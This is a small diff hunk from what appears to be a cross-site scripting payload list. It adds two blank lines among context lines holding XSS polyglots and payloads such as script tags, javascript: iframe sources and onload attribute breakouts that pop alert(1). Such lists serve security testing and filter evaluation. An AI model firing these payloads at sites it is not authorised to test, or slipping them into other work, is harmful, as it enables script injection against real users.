@@ -4076,6 +4076,8 @@ a="get";
 */alert(1)">'onload="/*<svg/1='
 `-alert(1)">'onload="`<svg/1='
 */</script>'>alert(1)/*<script/1='
+
+
 <script>alert(1)</script>
 <script src=javascript:alert(1)>
 <iframe src=javascript:alert(1)>
